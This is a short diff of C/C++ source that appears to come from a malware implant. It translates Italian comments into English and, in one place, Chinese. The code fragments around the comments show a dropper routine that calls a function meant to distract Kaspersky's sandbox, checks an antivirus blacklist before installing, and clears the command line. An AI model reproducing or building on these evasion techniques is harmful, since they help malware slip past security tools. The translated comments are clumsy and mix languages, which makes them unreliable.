@@ -1712,19 +1712,19 @@ HANDLE GetMediumLevelToken()
 	return hNewToken;
 }
 
-// Funzione richiamata dal dropper che sceglie il processo da usare per fare la 
-// CreateProcess e poi la invoca.
+// Function called from the dropper that chooses to use the process for making 
+// the CreateProcess and then invokes it.
 extern "C" void __stdcall HIDING(void);
 void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi)
 {
 	DWORD dummy;
 
-	// Cerca di "distrarre" la sandbox di kaspersky
+    //试图“分散注意力”沙箱卡巴斯基
 	HIDING();
 
 	//HideDevice dev_probe;
 	
-	// Ci sono degli AV con cui proprio non si deve installare
+    // There are some AV with which you just do not need to install
 	if (IsBlackList())  {
 		ReportCannotInstall();
 		return;
@@ -2756,7 +2756,7 @@ BOOL FindModulePath(char *path_buf, DWORD path_size)
 }
 
 
-// Cancella la command line
+// Delete the command line
 void HM_ClearCommand()
 {
 	char *ptr;
